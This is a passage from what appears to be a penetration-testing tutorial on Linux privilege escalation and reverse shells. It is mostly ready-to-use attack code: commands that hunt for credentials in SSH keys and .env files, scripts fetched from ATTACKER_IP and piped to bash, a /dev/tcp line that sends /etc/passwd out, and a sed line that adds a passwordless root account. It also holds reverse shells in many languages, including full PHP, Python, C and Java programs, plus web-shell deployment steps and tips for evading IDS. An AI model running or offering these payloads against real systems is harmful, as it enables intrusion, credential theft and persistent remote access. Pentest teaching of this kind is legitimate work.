find / -name "passwords*" -type f 2>/dev/null
find / -name "cred*" -type f 2>/dev/null
find / -name ".htpasswd" -type f 2>/dev/null
find / -name "wp-config.php" -type f 2>/dev/null
find / -name "config.php" -type f 2>/dev/null
find / -name "database.yml" -type f 2>/dev/null
find / -name ".env" -type f 2>/dev/null        # Docker/Laravel/etc env files!
find / -name "*.sql" -type f 2>/dev/null       # Database dumps
find / -name "id_rsa" -type f 2>/dev/null      # SSH private keys
find / -name "id_dsa" -type f 2>/dev/null
find / -name "*.pem" -type f 2>/dev/null       # TLS private keys
find / -name "*.key" -type f 2>/dev/null

# Search file CONTENTS for keywords
grep -r "password" /etc/ 2>/dev/null
grep -r "passwd" /var/www/ 2>/dev/null
grep -r "DB_PASS" / 2>/dev/null
grep -ri "secret" /home/ 2>/dev/null
grep -ri "api_key" /var/www/ 2>/dev/null

# Recently modified files (within 10 minutes)
find / -type f -mmin -10 2>/dev/null | grep -v proc | grep -v sys

# Backup files
find / -name "*.bak" -type f 2>/dev/null
find / -name "*.backup" -type f 2>/dev/null
find / -name "*.old" -type f 2>/dev/null
find / -name "*~" -type f 2>/dev/null      # Vim/editor backups

# Check /tmp and /var/tmp for interesting things
ls -la /tmp/
ls -la /var/tmp/
ls -la /dev/shm/          # Shared memory — often used by attackers
```

### 2.4.4 Capabilities

```bash
# Find files with Linux capabilities set
getcap -r / 2>/dev/null

# Example dangerous capabilities:
# /usr/bin/python3.8 = cap_setuid+ep   → can set UID to 0!
# /usr/bin/perl = cap_setuid+ep
# /usr/bin/vim.basic = cap_setuid+ep
```

Capabilities are like fine-grained SUID — instead of giving all root powers, they give specific kernel abilities. Certain capabilities lead directly to root.

### 2.4.5 Cron Jobs

```bash
# System cron jobs
cat /etc/crontab               # System crontab
cat /etc/cron.d/*              # Drop-in cron files
ls -la /etc/cron.d/
ls -la /etc/cron.daily/        # Daily scripts
ls -la /etc/cron.hourly/       # Hourly scripts
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# User crontabs
crontab -l                     # Current user's cron
crontab -l -u root             # Root's cron (may fail without sudo)
cat /var/spool/cron/crontabs/root   # Root's crontab file directly

# Watch cron execution
watch -n 1 'ls -la /tmp'      # Watch for new files created by cron
# Use pspy for better monitoring:
./pspy64 -f -i 100            # Watch filesystem + processes every 100ms
```

**Crontab time format:**
```
* * * * * command
│ │ │ │ │
│ │ │ │ └── Day of week (0-7, 0 and 7 = Sunday)
│ │ │ └──── Month (1-12)
│ │ └────── Day of month (1-31)
│ └──────── Hour (0-23)
└────────── Minute (0-59)

Examples:
*/5 * * * *     → every 5 minutes
0 */2 * * *     → every 2 hours
@reboot         → at system boot
```

## 2.5 Automated Enumeration Tools

These tools automate the above checks and more. Always have them ready.

### 2.5.1 LinPEAS

The most comprehensive Linux enumeration script. Finds nearly everything.

```bash
# Download and run
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# From attacker machine, serve and run:
# Attacker:
python3 -m http.server 8000

# Victim:
curl http://ATTACKER_IP:8000/linpeas.sh | bash
wget -qO- http://ATTACKER_IP:8000/linpeas.sh | bash

# Or download, then run with colors
chmod +x linpeas.sh
./linpeas.sh 2>/dev/null | tee output.txt

# Key flags:
./linpeas.sh -a    # All checks (slower but more thorough)
./linpeas.sh -s    # Stealth (less noisy)
```

### 2.5.2 LinEnum

```bash
curl http://ATTACKER_IP:8000/LinEnum.sh | bash
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
# -s: supply current user password for sudo checks
# -k: keyword to search for in config files
# -r: save report to file
# -t: thorough tests
```

### 2.5.3 linux-exploit-suggester

```bash
# After getting kernel version, suggest kernel exploits
./linux-exploit-suggester.sh
./linux-exploit-suggester.sh --uname "4.4.0-116-generic"

# Or the Perl version:
./linux-exploit-suggester-2.pl -k 4.4.0
```

### 2.5.4 pspy

```bash
# Monitor processes without root
./pspy64          # 64-bit
./pspy32          # 32-bit

# Options:
./pspy64 -i 50                  # Poll interval 50ms (default 100)
./pspy64 -f                     # Watch filesystem events too
./pspy64 -c                     # Color output
./pspy64 2>/dev/null | tee pspy_output.txt
```

---

# Chapter 3: Essential Tools & Commands Deep Dive

## 3.1 The `find` Command — Master Reference

We introduced `find` earlier, but here's the complete reference for privilege escalation work:

```bash
# ============================================
# SYNTAX: find [path...] [expression]
# ============================================

# --- BASIC EXAMPLES ---
find / -name "shadow" 2>/dev/null          # Find file named exactly "shadow"
find / -name "*.php" 2>/dev/null           # Find all PHP files
find / -iname "readme*" 2>/dev/null        # Case-insensitive name match

# --- BY PERMISSIONS ---
find / -perm -4000 2>/dev/null             # SUID bit set (any)
find / -perm -2000 2>/dev/null             # SGID bit set (any)
find / -perm -1000 2>/dev/null             # Sticky bit set (any)
find / -perm -o+w 2>/dev/null              # Others have write
find / -perm -u+s 2>/dev/null              # User (owner) SUID set
find / -perm 777 2>/dev/null               # Exactly 777
find / -perm /222 2>/dev/null              # Anyone can write (OR logic)
find / -writable 2>/dev/null               # Writable by current user

# --- BY OWNERSHIP ---
find / -user root 2>/dev/null              # Owned by root
find / -group shadow 2>/dev/null           # Owned by shadow group
find / -nouser 2>/dev/null                 # No valid user (orphan files)
find / -nogroup 2>/dev/null                # No valid group

# --- BY TYPE ---
find / -type f 2>/dev/null                 # Regular files
find / -type d 2>/dev/null                 # Directories
find / -type l 2>/dev/null                 # Symbolic links
find / -type b 2>/dev/null                 # Block devices
find / -type c 2>/dev/null                 # Character devices
find / -type s 2>/dev/null                 # Sockets
find / -type p 2>/dev/null                 # Named pipes (FIFOs)

# --- BY TIME ---
find / -mtime -1 2>/dev/null               # Modified < 1 day ago
find / -mtime +30 2>/dev/null              # Modified > 30 days ago
find / -mmin -60 2>/dev/null               # Modified < 60 minutes ago
find / -atime -1 2>/dev/null               # Accessed < 1 day ago
find / -ctime -1 2>/dev/null               # inode Changed < 1 day ago
find / -newer /etc/passwd 2>/dev/null      # Newer than /etc/passwd

# --- BY SIZE ---
find / -size +1M 2>/dev/null               # Larger than 1 MB
find / -size -10k 2>/dev/null              # Smaller than 10 KB
find / -size +1G 2>/dev/null               # Larger than 1 GB
find / -empty 2>/dev/null                  # Empty files/dirs

# --- COMBINING CONDITIONS ---
find / -user root -perm -4000 2>/dev/null          # Root-owned SUID
find / -type f -name "*.conf" -writable 2>/dev/null  # Writable configs
find / -perm -4000 -o -perm -2000 2>/dev/null       # SUID OR SGID
find / -not -user root -perm -4000 2>/dev/null       # SUID not owned by root
find / -type f \( -name "*.sh" -o -name "*.py" \) 2>/dev/null  # .sh or .py

# --- ACTIONS ---
find / -perm -4000 -exec ls -la {} \; 2>/dev/null   # ls each found file
find / -perm -4000 -ls 2>/dev/null                   # Built-in ls action
find / -perm -4000 -print0 | xargs -0 ls -la         # Null-delimited (handles spaces)
find / -name "*.bak" -delete 2>/dev/null              # Delete found files
find / -type f -exec grep -l "password" {} \; 2>/dev/null  # Find files containing "password"
find / -type f -exec grep -Hi "password" {} \; 2>/dev/null  # Show matching lines

# --- DEPTH CONTROL ---
find / -maxdepth 3 -perm -4000 2>/dev/null            # Only 3 levels deep
find / -mindepth 2 -maxdepth 5 -perm -4000 2>/dev/null

# --- PRACTICAL PRIVESC COMBOS ---

# SUID binaries NOT in standard system paths
find / -perm -4000 -type f 2>/dev/null | grep -v "^/usr/bin\|^/bin\|^/usr/sbin\|^/sbin"

# Writable scripts run as root in cron
find /etc/cron* /var/spool/cron -writable -type f 2>/dev/null

# Config files with plaintext passwords
find / -name "*.conf" -exec grep -l "password\|passwd\|secret" {} \; 2>/dev/null

# Recently created/modified files (good after getting initial shell)
find / -type f -newer /tmp -ls 2>/dev/null | head -50
```

## 3.2 The `grep` Command — Master Reference

```bash
# ============================================
# SYNTAX: grep [options] PATTERN [file...]
# ============================================

# --- BASIC ---
grep "root" /etc/passwd                    # Find lines containing "root"
grep -i "root" /etc/passwd                 # Case-insensitive
grep -v "root" /etc/passwd                 # Lines NOT containing "root"
grep -n "root" /etc/passwd                 # Show line numbers
grep -c "root" /etc/passwd                 # Count matching lines
grep -l "password" /etc/                   # List filenames with matches
grep -L "password" /etc/*.conf             # Files WITHOUT match

# --- PATTERN TYPES ---
grep -E "root|daemon" /etc/passwd          # Extended regex (OR)
grep -P "\d{4}" /etc/passwd                # Perl-compatible regex
grep -F "password=admin" file.txt          # Fixed string (no regex)
grep "^root" /etc/passwd                   # Lines STARTING with root
grep "bash$" /etc/passwd                   # Lines ENDING with bash
grep "r..t" /etc/passwd                    # Dot = any character
grep "[rR]oot" /etc/passwd                 # Character class

# --- RECURSIVE SEARCHING ---
grep -r "password" /etc/                   # Recursive through /etc
grep -r "password" /var/www/               # Search web root
grep -ri "password" /home/                 # Case-insensitive recursive
grep -rl "password" /etc/                  # Just filenames
grep -rn "password" /etc/                  # With line numbers

# --- CONTEXT ---
grep -A 3 "password" file.txt              # 3 lines AFTER match
grep -B 3 "password" file.txt              # 3 lines BEFORE match
grep -C 3 "password" file.txt              # 3 lines before AND after

# --- PRIVESC CREDENTIAL HUNTING ---
grep -ri "password" /etc/ 2>/dev/null
grep -ri "passwd" /var/www/ 2>/dev/null
grep -ri "secret" /opt/ 2>/dev/null
grep -ri "api[_-]key" / 2>/dev/null | grep -v Binary
grep -ri "db_pass\|database_password\|db_password" / 2>/dev/null
grep -ri "mysql\|pgsql" /var/www/ 2>/dev/null | grep -i "pass"
grep -ri "PRIVATE KEY" / 2>/dev/null       # Find private keys

# Grep binaries for strings (look for embedded credentials)
strings /usr/local/bin/something | grep -i pass
```

## 3.3 Other Essential Commands

### 3.3.1 `ls` — File Listing

```bash
ls -la              # Long format, all files including hidden
ls -lah             # Human-readable sizes
ls -latr            # Sort by time, reverse (newest last)
ls -laS             # Sort by size (largest first)
ls -la --color=always  # Colorized output
ls -la /root/       # Try to list root's home (check permissions!)
ls -la /            # Root of filesystem
```

### 3.3.2 `cat`, `more`, `less`, `head`, `tail`

```bash
cat /etc/passwd                  # Read entire file
cat -A file.txt                  # Show all characters (see \r\n etc)
head -20 /etc/passwd             # First 20 lines
tail -20 /var/log/auth.log       # Last 20 lines
tail -f /var/log/auth.log        # Follow (live updates)
less /var/log/syslog             # Paginated reading (q to quit, / to search)
more /etc/crontab                # Simple pager

# Reading files without cat (useful for restricted environments)
while IFS= read -r line; do echo "$line"; done < /etc/passwd
python3 -c "print(open('/etc/shadow').read())"
```

### 3.3.3 `chmod` and `chown`

```bash
# Permissions
chmod 777 file          # rwxrwxrwx — full permissions
chmod 755 script.sh     # rwxr-xr-x — typical script
chmod +x script.sh      # Add execute bit
chmod -w file           # Remove write bit
chmod u+s binary        # Set SUID bit on binary
chmod g+s directory     # Set SGID on directory
chmod 4755 binary       # SUID + rwxr-xr-x in one go
chmod 2755 binary       # SGID + rwxr-xr-x
chmod 1777 /tmp         # Sticky bit on directory

# Ownership
chown root:root file    # Change to root:root
chown alice:alice file  # Change owner and group
chown -R www-data /var/www  # Recursive chown
```

### 3.3.4 Process Management

```bash
# Kill processes
kill PID                # SIGTERM (graceful)
kill -9 PID             # SIGKILL (force)
kill -l                 # List all signals
killall processname     # Kill by name
pkill -u alice          # Kill all processes by user

# Background/foreground
command &               # Run in background
Ctrl+Z                  # Suspend current process
bg                      # Resume in background
fg                      # Bring to foreground
jobs                    # List background jobs

# Process priority
nice -n -20 command     # Highest priority
renice -n 10 -p PID     # Lower priority of running process
```

### 3.3.5 `awk` and `sed`

```bash
# awk — text processing powerhouse
awk '{print $1}' file              # Print first field
awk -F: '{print $1}' /etc/passwd   # Use : as delimiter, print username
awk -F: '$3 == 0' /etc/passwd      # Print lines where field 3 == 0 (root UID)
awk -F: '$3 >= 1000' /etc/passwd   # Regular users (UID >= 1000)
awk -F: '{print $1, $7}' /etc/passwd  # Print username and shell
awk '/root/' /etc/passwd           # Print lines containing "root"
awk 'NR==5' file                   # Print 5th line
awk 'NR>=5 && NR<=10' file         # Lines 5-10
awk '{sum+=$1} END {print sum}'    # Sum first column

# sed — stream editor
sed 's/old/new/g' file             # Replace all occurrences
sed -i 's/old/new/g' file          # In-place replacement
sed -n '5p' file                   # Print line 5
sed -n '5,10p' file                # Print lines 5-10
sed '/pattern/d' file              # Delete matching lines
sed 's/^/PREFIX/' file             # Add prefix to each line
sed 's/$/ SUFFIX/' file            # Add suffix to each line

# Adding a root user to /etc/passwd (if writable!)
sed -i '$ahacked::0:0:hacked:/root:/bin/bash' /etc/passwd
# Then: su hacked (no password)
```

---

---

# PART II — SHELL FUNDAMENTALS

---

# Chapter 4: Getting a Shell — Every Method

## 4.1 What is a Shell?

A shell is a command interpreter — the interface between you (or your exploit) and the operating system kernel. In the context of penetration testing, "getting a shell" means obtaining interactive command execution on a target system.

**Types of shells in pentesting:**

| Type | Direction | Use Case |
|------|-----------|----------|
| **Reverse Shell** | Target connects back to attacker | Bypass inbound firewall |
| **Bind Shell** | Attacker connects to target's open port | Target has inbound access |
| **Web Shell** | Execute via HTTP requests | Web server compromise |
| **Named Pipe Shell** | Via FIFO | Restricted environments |
| **Interactive TTY** | Proper terminal | After getting dumb shell |

## 4.2 Understanding Shell Types

### 4.2.1 Dumb Shell vs. Interactive Shell vs. TTY

**Dumb Shell (non-interactive):**
- You can run commands and get output
- No tab completion
- Ctrl+C kills your shell (not the remote command)
- Cannot use sudo, su, ssh (requires interactive terminal)
- vi/nano/less won't work properly

**Interactive Shell:**
- Can read from stdin
- Has job control
- Can run interactive programs

**TTY (Teletypewriter):**
- Full terminal emulation
- Ctrl+C sends SIGINT to the REMOTE process
- Tab completion, arrow keys, history
- Can use sudo, su, ssh properly
- vi, nano, less, all work correctly

**Why does this matter?** Many SUID exploits and sudo escalations require a proper TTY. Without it, `sudo -l` may work but actually exploiting sudo might fail.

## 4.3 Generating Reverse Shell Payloads

### 4.3.1 One-Liners Quick Reference

Before diving deep, here are the fastest one-liners. Replace `LHOST` with your attacker IP and `LPORT` with your listening port.

```bash
# Listener on attacker machine:
nc -lvnp 4444

# Then send one of these payloads to victim:

# Bash TCP (most common)
bash -i >& /dev/tcp/LHOST/LPORT 0>&1

# Bash TCP variant (URL-encoded for web)
bash%20-i%20>%26%20/dev/tcp/LHOST/LPORT%200>%261

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Netcat (traditional)
nc LHOST LPORT -e /bin/bash
nc LHOST LPORT -e /bin/sh

# Netcat OpenBSD (no -e flag)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT >/tmp/f

# Perl
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# PowerShell (for mixed environments)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream=$client.GetStream();...

# Socat (best quality shell)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT
```

---

# Chapter 5: Reverse Shells — Every Language & Case

## 5.1 How a Reverse Shell Works (Theory)

```
ATTACKER MACHINE                    VICTIM MACHINE
192.168.1.10                        192.168.1.20

nc -lvnp 4444  ←←←←←←←←←←←←←←←  bash -i >& /dev/tcp/192.168.1.10/4444 0>&1
(listening)          TCP connection  (connecting out)
                     initiated by
                      VICTIM
```

**Why reverse instead of bind?**

Most real targets have:
- Inbound firewall blocking random ports → bind shell won't work
- Outbound connections allowed (for web browsing) → reverse shell works

**Port selection strategy:**
- Use common ports: 443 (HTTPS), 80 (HTTP), 53 (DNS), 8080, 8443
- These are more likely to pass through egress filters
- Port 443 especially — firewalls rarely block outbound HTTPS

```bash
# Listener on common ports (may need root for 443/80)
nc -lvnp 443
nc -lvnp 80
nc -lvnp 8443
rlwrap nc -lvnp 4444    # rlwrap adds readline (arrow keys, history!)
```

## 5.2 Bash Reverse Shells

### 5.2.1 Standard Bash TCP Reverse Shell

```bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
```

**Breaking this down character by character:**

```
bash            → invoke bash interpreter
-i              → interactive mode (needed for shell features)
>&              → redirect BOTH stdout and stderr
/dev/tcp/IP/PORT → special bash built-in: creates TCP socket to IP:PORT
0>&1            → redirect stdin (fd 0) to point at fd 1 (our socket)
```

So: stdout and stderr go to the TCP socket, and stdin is also the socket. Full bidirectional shell!

**How /dev/tcp works:**

```
/dev/tcp/HOST/PORT  → Bash pseudo-device: opens TCP connection
/dev/udp/HOST/PORT  → UDP version

# Test connectivity (does target can reach attacker?):
bash -c 'cat /etc/passwd > /dev/tcp/LHOST/LPORT'   # Exfil a file
bash -c 'echo test > /dev/tcp/LHOST/LPORT'          # Test connection
```

### 5.2.2 Alternative Bash Syntaxes

```bash
# Variant 2 — sometimes needed if >&  is filtered
bash -i > /dev/tcp/LHOST/LPORT 2>&1 < /dev/tcp/LHOST/LPORT

# Variant 3 — explicit file descriptors
exec 5<>/dev/tcp/LHOST/LPORT; cat <&5 | while read line; do $line 2>&5 >&5; done

# Variant 4 — exec redirect
0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196

# Variant 5 — using /dev/tcp in a subshell
(bash -i >& /dev/tcp/LHOST/LPORT 0>&1) &

# UDP reverse shell (sometimes bypasses TCP firewall rules)
bash -i >& /dev/udp/LHOST/LPORT 0>&1
# Listener: nc -u -lvnp LPORT
```

## 5.3 Python Reverse Shells

### 5.3.1 Python 3 Reverse Shell (Detailed)

```python
# One-liner:
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'

# Expanded/explained version:
import socket
import subprocess
import os
import pty

# Create a TCP socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to attacker
s.connect(("LHOST", LPORT))

# dup2: duplicate file descriptor
# os.dup2(s.fileno(), 0) → stdin  (fd 0) now points to socket
# os.dup2(s.fileno(), 1) → stdout (fd 1) now points to socket
# os.dup2(s.fileno(), 2) → stderr (fd 2) now points to socket
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# pty.spawn() spawns a PTY (pseudo-terminal) — gives us a proper TTY!
pty.spawn("/bin/bash")
```

### 5.3.2 Python 2 Reverse Shell

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

### 5.3.3 Python with OS Module Alternative

```python
python3 -c '
import os
os.dup2(os.open("/dev/tcp/LHOST/LPORT",os.O_RDWR),0)
os.dup2(0,1)
os.dup2(0,2)
os.execve("/bin/sh",["/bin/sh","-i"],os.environ)
'
```

### 5.3.4 Python Reverse Shell Script File

```python
#!/usr/bin/env python3
# revshell.py - upload to target and execute

import socket
import subprocess
import os
import sys
import pty
import time

HOST = "LHOST"
PORT = LPORT

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    while True:
        try:
            s.connect((HOST, PORT))
            break
        except:
            time.sleep(5)  # Retry every 5 seconds
    
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    
    pty.spawn("/bin/bash")

connect()
```

## 5.4 PHP Reverse Shells

### 5.4.1 PHP One-Liner

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"); ?>

<!-- Or: -->
<?php system("bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"); ?>

<!-- Passthru variant: -->
<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f"); ?>
```

### 5.4.2 PHP Socket Reverse Shell (Complete)

```php
<?php
// php-reverse-shell.php
// Classic pentestmonkey PHP reverse shell

set_time_limit(0);
$VERSION = "1.0";
$ip = 'LHOST';
$port = LPORT;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    
    if ($pid) {
        exit(0);  // Parent exits
    }
    
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }
    
    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise. Running in foreground.");
}

chdir("/");
umask(0);

// Open socket connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

// Spawn shell process
$descriptorspec = array(
    0 => array("pipe", "r"),  // stdin  ← read from pipe
    1 => array("pipe", "w"),  // stdout → write to pipe
    2 => array("pipe", "w")   // stderr → write to pipe
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

// Set streams non-blocking
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

// I/O loop
while (1) {
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }
    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }
    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
    global $daemon;
    if (!$daemon) {
        print "$string\n";
    }
}
?>
```

**Deploying PHP shells:**

```bash
# If file upload exists on web app:
# 1. Upload the PHP file
# 2. Start listener: nc -lvnp LPORT
# 3. Navigate to: http://target/uploads/shell.php

# If you can write to web root:
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/cmd.php
# Then: http://target/cmd.php?cmd=id

# If LFI exists, use PHP wrappers:
curl "http://target/index.php?page=php://input" -d '<?php system("bash -i >& /dev/tcp/LHOST/LPORT 0>&1"); ?>'
```

## 5.5 Perl Reverse Shell

```perl
# One-liner
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Script version
#!/usr/bin/perl
use strict;
use Socket;

my $host = "LHOST";
my $port = LPORT;

socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
connect(SOCKET, sockaddr_in($port, inet_aton($host)));

# Redirect stdin/stdout/stderr to socket
open(STDIN,  ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");

exec("/bin/bash -i");
```

## 5.6 Ruby Reverse Shell

```ruby
# One-liner
ruby -rsocket -e'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# With IO dup
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("LHOST","LPORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Script version
#!/usr/bin/ruby
require 'socket'

c = TCPSocket.new("LHOST", LPORT)

# dup2 equivalent in Ruby
$stdin.reopen(c)
$stdout.reopen(c)
$stderr.reopen(c)

exec "/bin/bash -i"
```

## 5.7 C/C++ Reverse Shell

```c
/* reverse_shell.c */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define LHOST "ATTACKER_IP"
#define LPORT 4444

int main() {
    int sockfd;
    struct sockaddr_in server;
    
    // Create TCP socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    server.sin_family = AF_INET;
    server.sin_port = htons(LPORT);
    server.sin_addr.s_addr = inet_addr(LHOST);
    
    // Connect to attacker
    connect(sockfd, (struct sockaddr *)&server, sizeof(server));
    
    // Redirect stdin, stdout, stderr to socket
    dup2(sockfd, 0);   // stdin
    dup2(sockfd, 1);   // stdout
    dup2(sockfd, 2);   // stderr
    
    // Execute shell
    execve("/bin/bash", NULL, NULL);
    
    return 0;
}

// Compile: gcc -o shell reverse_shell.c
// Run: ./shell
```

**Advanced C shell with fork (daemonizes itself):**

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <signal.h>

#define LHOST "ATTACKER_IP"
#define LPORT 4444

int main() {
    // Daemonize
    if (fork()) exit(0);
    setsid();
    
    int sockfd;
    struct sockaddr_in server;
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    server.sin_family = AF_INET;
    server.sin_port = htons(LPORT);
    server.sin_addr.s_addr = inet_addr(LHOST);
    
    connect(sockfd, (struct sockaddr *)&server, sizeof(server));
    
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    
    char * const argv[] = { "/bin/bash", "-i", NULL };
    execve("/bin/bash", argv, NULL);
    
    return 0;
}
```

## 5.8 Netcat Reverse Shells

```bash
# Standard (with -e flag — older versions)
nc -e /bin/bash LHOST LPORT
nc -e /bin/sh LHOST LPORT

# OpenBSD netcat (no -e) — named pipe method
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT > /tmp/f
# How this works:
# mkfifo creates a named pipe (FIFO)
# cat reads from the pipe → feeds to /bin/sh
# sh output (stdout+stderr) → goes to nc → sends to attacker
# nc receives attacker's input → writes to /tmp/f → cat reads it → sh executes it

# All on one line:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT > /tmp/f

# Using /dev/tcp instead of nc (no nc needed!)
/bin/bash -i > /dev/tcp/LHOST/LPORT 2>&1 < /dev/tcp/LHOST/LPORT

# Using ncat (often installed with nmap)
ncat LHOST LPORT -e /bin/bash

# Using ncat with SSL (evades detection/IDS)
# Attacker: ncat --ssl -lvnp 4444
# Victim:   ncat --ssl LHOST 4444 -e /bin/bash
```

## 5.9 Java Reverse Shell

```java
// Java reverse shell
// Compile: javac ReverseShell.java
// Run: java ReverseShell

import java.io.*;
import java.net.*;

public class ReverseShell {
    public static void main(String[] args) throws Exception {
        String host = "LHOST";
        int port = LPORT;
        
        // Connect to attacker
        Socket s = new Socket(host, port);
        
        // Get socket streams
        Process p = Runtime.getRuntime().exec("/bin/bash -i");
        
        // Connect socket to process
        InputStream pi = p.getInputStream();
        InputStream pe = p.getErrorStream();
        OutputStream ps = p.getOutputStream();
        OutputStream so = s.getOutputStream();
        InputStream si = s.getInputStream();
        
        // Pipe data
        while (!s.isClosed()) {
            while (pi.available() > 0) so.write(pi.read());
            while (pe.available() > 0) so.write(pe.read());
            while (si.available() > 0) ps.write(si.read());
            so.flush();
            ps.flush();
            Thread.sleep(50);
            if (p.exitValue() >= 0) break;
        }
    }
}
```

```bash
# Java one-liner (base64 encoded class, useful for injection)
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## 5.10 Socat Reverse Shell (Best Quality)

Socat gives you the best quality reverse shell — fully interactive TTY.

```bash
# ATTACKER SETUP:
socat file:`tty`,raw,echo=0 tcp-listen:LPORT

# VICTIM (connect back):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT

# Breakdown of victim command:
# socat                 → socat program
# exec:'bash -li'       → execute bash interactive login
# ,pty                  → allocate PTY
# ,stderr               → include stderr
# ,setsid               → new session (detaches from terminal)
# ,sigint               → pass SIGINT through
# ,sane                 → normalize terminal settings
# tcp:LHOST:LPORT       → connect to attacker via TCP
```

**Getting socat on target:**

```bash
# If wget/curl available:
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
chmod +x /tmp/socat

# From your machine via nc:
# Attacker: nc -q 0 -lvnp 9999 < socat
# Victim: nc LHOST 9999 > /tmp/socat

# From python http server:
